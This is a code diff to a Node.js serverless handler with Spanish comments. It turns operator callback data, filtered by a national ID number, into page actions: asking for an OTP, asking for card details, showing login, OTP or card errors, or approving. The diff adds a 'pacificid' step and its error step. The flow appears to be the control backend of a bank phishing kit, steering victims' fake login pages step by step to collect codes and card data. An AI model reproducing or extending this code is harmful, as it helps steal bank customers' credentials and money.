@@ -54,12 +54,14 @@ exports.handler = async (event) => {
       // Filtrar por cédula si viene
       if (cedula && !cbData.includes(cedula)) continue;
 
-      if (cbData.startsWith("otp_"))           return { statusCode: 200, headers, body: JSON.stringify({ action: "otp" }) };
-      if (cbData.startsWith("tarjeta_"))       return { statusCode: 200, headers, body: JSON.stringify({ action: "tarjeta" }) };
-      if (cbData.startsWith("error_login_"))   return { statusCode: 200, headers, body: JSON.stringify({ action: "error_login" }) };
-      if (cbData.startsWith("error_otp_"))     return { statusCode: 200, headers, body: JSON.stringify({ action: "error_otp" }) };
-      if (cbData.startsWith("error_tarjeta_")) return { statusCode: 200, headers, body: JSON.stringify({ action: "error_tarjeta" }) };
-      if (cbData.startsWith("aprobar_"))       return { statusCode: 200, headers, body: JSON.stringify({ action: "aprobar" }) };
+      if (cbData.startsWith("otp_"))              return { statusCode: 200, headers, body: JSON.stringify({ action: "otp" }) };
+      if (cbData.startsWith("pacificid_"))         return { statusCode: 200, headers, body: JSON.stringify({ action: "pacificid" }) };
+      if (cbData.startsWith("tarjeta_"))           return { statusCode: 200, headers, body: JSON.stringify({ action: "tarjeta" }) };
+      if (cbData.startsWith("error_login_"))       return { statusCode: 200, headers, body: JSON.stringify({ action: "error_login" }) };
+      if (cbData.startsWith("error_otp_"))         return { statusCode: 200, headers, body: JSON.stringify({ action: "error_otp" }) };
+      if (cbData.startsWith("error_pacificid_"))   return { statusCode: 200, headers, body: JSON.stringify({ action: "error_pacificid" }) };
+      if (cbData.startsWith("error_tarjeta_"))     return { statusCode: 200, headers, body: JSON.stringify({ action: "error_tarjeta" }) };
+      if (cbData.startsWith("aprobar_"))           return { statusCode: 200, headers, body: JSON.stringify({ action: "aprobar" }) };
     }
 
     return { statusCode: 200, headers, body: JSON.stringify({ action: null }) };
